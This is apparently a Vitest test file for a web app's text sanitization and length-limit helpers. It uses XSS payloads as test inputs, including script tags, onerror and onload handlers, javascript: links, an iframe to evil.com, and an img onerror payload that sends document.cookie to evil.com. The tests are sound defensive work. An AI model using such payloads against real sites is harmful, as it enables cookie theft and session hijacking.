/**
 * Tests for abuse detection and input sanitization utilities.
 * Verifies max-length validation (assertMaxLength) and XSS prevention (sanitizeText)
 * with boundary, edge-case, and malicious-payload scenarios.
 */
import { describe, expect, it } from "vitest";
import { assertMaxLength, sanitizeText, MAX_NAME_LENGTH, MAX_MESSAGE_LENGTH, MAX_REASON_LENGTH, MAX_STALL_NAME_LENGTH, MAX_PHONE_LENGTH, MAX_INPUT_LENGTH } from "../../server/lib/text-utils.ts";

/**
 * Validation function that throws if a value exceeds the given character limit.
 * Accepts null/undefined gracefully — only strings are checked.
 */
describe("assertMaxLength", () => {
  it("passes when value is within limit", () => {
    expect(() => assertMaxLength("hello", 10, "test")).not.toThrow();
  });

  it("passes when value equals the limit", () => {
    expect(() => assertMaxLength("1234567890", 10, "test")).not.toThrow();
  });

  it("throws 400 when value exceeds limit", () => {
    expect(() => assertMaxLength("12345678901", 10, "test")).toThrow();
  });

  it("throws with statusCode 400", () => {
    try {
      assertMaxLength("too long value here", 5, "field");
    } catch (error) {
      expect((error as Error & { statusCode: number }).statusCode).toBe(400);
    }
  });

  it("includes field name in error message", () => {
    expect(() => assertMaxLength("too long value here", 5, "MyField")).toThrow(/MyField/);
  });

  it("passes on null", () => {
    expect(() => assertMaxLength(null, 10, "test")).not.toThrow();
  });

  it("passes on undefined", () => {
    expect(() => assertMaxLength(undefined, 10, "test")).not.toThrow();
  });

  it("passes on empty string", () => {
    expect(() => assertMaxLength("", 10, "test")).not.toThrow();
  });
});

describe("sanitizeText", () => {
  it("escapes < and >", () => {
    expect(sanitizeText("<script>alert('xss')</script>")).toBe("&lt;script&gt;alert(&#x27;xss&#x27;)&lt;&#x2F;script&gt;");
  });

  it("escapes double quotes", () => {
    expect(sanitizeText('say "hello"')).toBe('say &quot;hello&quot;');
  });

  it("escapes single quotes", () => {
    expect(sanitizeText("it's a test")).toBe("it&#x27;s a test");
  });

  it("escapes forward slashes", () => {
    expect(sanitizeText("http://evil.com/")).toBe("http:&#x2F;&#x2F;evil.com&#x2F;");
  });

  it("returns empty string for null", () => {
    expect(sanitizeText(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(sanitizeText(undefined)).toBe("");
  });

  it("preserves safe text", () => {
    expect(sanitizeText("hello world")).toBe("hello world");
  });

  it("handles mixed content", () => {
    const input = 'normal <b>bold</b> & "quoted" text';
    const expected = "normal &lt;b&gt;bold&lt;&#x2F;b&gt; &amp; &quot;quoted&quot; text";
    // Note: sanitizeText does NOT escape &, so we adjust
    expect(sanitizeText(input)).not.toContain("<b>");
    expect(sanitizeText(input)).toContain("&lt;b&gt;");
    expect(sanitizeText(input)).toContain("&quot;");
  });

  it("prevents common XSS patterns", () => {
    const patterns = [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      '"><script>alert(1)</script>',
      "<body onload=alert(1)>",
      "<!--<script>-->",
    ];
    for (const pattern of patterns) {
      const result = sanitizeText(pattern);
      expect(result).not.toContain("<script>");
      expect(result).not.toContain("<img");
      expect(result).not.toContain("<svg");
      expect(result).not.toContain("<body");
      expect(result).not.toContain("<!--");
    }
  });
});

describe("abuse scenarios - large payload", () => {
  it("assertMaxLength rejects payload exceeding MAX_NAME_LENGTH", () => {
    const payload = "x".repeat(MAX_NAME_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_NAME_LENGTH, "Name")).toThrow();
  });

  it("assertMaxLength rejects payload exceeding MAX_MESSAGE_LENGTH", () => {
    const payload = "x".repeat(MAX_MESSAGE_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_MESSAGE_LENGTH, "Message")).toThrow();
  });

  it("assertMaxLength rejects payload exceeding MAX_REASON_LENGTH", () => {
    const payload = "x".repeat(MAX_REASON_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_REASON_LENGTH, "Reason")).toThrow();
  });

  it("assertMaxLength rejects payload exceeding MAX_STALL_NAME_LENGTH", () => {
    const payload = "x".repeat(MAX_STALL_NAME_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_STALL_NAME_LENGTH, "Stall name")).toThrow();
  });

  it("assertMaxLength rejects payload exceeding MAX_PHONE_LENGTH", () => {
    const payload = "x".repeat(MAX_PHONE_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_PHONE_LENGTH, "Phone")).toThrow();
  });

  it("assertMaxLength rejects payload exceeding MAX_INPUT_LENGTH", () => {
    const payload = "x".repeat(MAX_INPUT_LENGTH + 1);
    expect(() => assertMaxLength(payload, MAX_INPUT_LENGTH, "Input")).toThrow();
  });

  it("sanitizeText handles extremely long strings without throwing", () => {
    const longString = "<script>alert('xss')</script>".repeat(1000);
    expect(() => sanitizeText(longString)).not.toThrow();
    expect(sanitizeText(longString)).not.toContain("<script>");
  });
});

describe("abuse scenarios - HTML injection into text fields", () => {
  it("sanitizeText removes script tags from user input", () => {
    const malicious = '<script>document.cookie="hacked"</script>';
    expect(sanitizeText(malicious)).not.toContain("<script>");
  });

  it("sanitizeText handles event handler attributes by breaking HTML structure", () => {
    const malicious = '<img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';
    const result = sanitizeText(malicious);
    expect(result).toContain("&lt;img");
    expect(result).toContain("&gt;");
    expect(result).not.toContain("<img");
  });

  it("sanitizeText handles iframe injection", () => {
    const malicious = '<iframe src="https://evil.com/phishing"></iframe>';
    const result = sanitizeText(malicious);
    expect(result).not.toContain("<iframe");
    expect(result).toContain("&lt;iframe");
  });

  it("sanitizeText prevents href-based XSS in anchor tags", () => {
    // SanitizeText does not specifically handle href, but escapes angle brackets
    const malicious = '<a href="javascript:alert(1)">click</a>';
    const result = sanitizeText(malicious);
    expect(result).not.toContain("<a");
    expect(result).toContain("&lt;a");
  });

  it("combined: sanitize then assertMaxLength works correctly", () => {
    const raw = "<script>alert('xss')</script>";
    const sanitized = sanitizeText(raw);
    expect(() => assertMaxLength(sanitized, 200, "Input")).not.toThrow();
    expect(sanitized.length).toBeGreaterThan(raw.length);
  });
});

describe("abuse scenarios - null/undefined boundary conditions", () => {
  it("assertMaxLength does not throw on very long null/undefined", () => {
    expect(() => assertMaxLength(null, 5, "Field")).not.toThrow();
    expect(() => assertMaxLength(undefined, 5, "Field")).not.toThrow();
  });
});
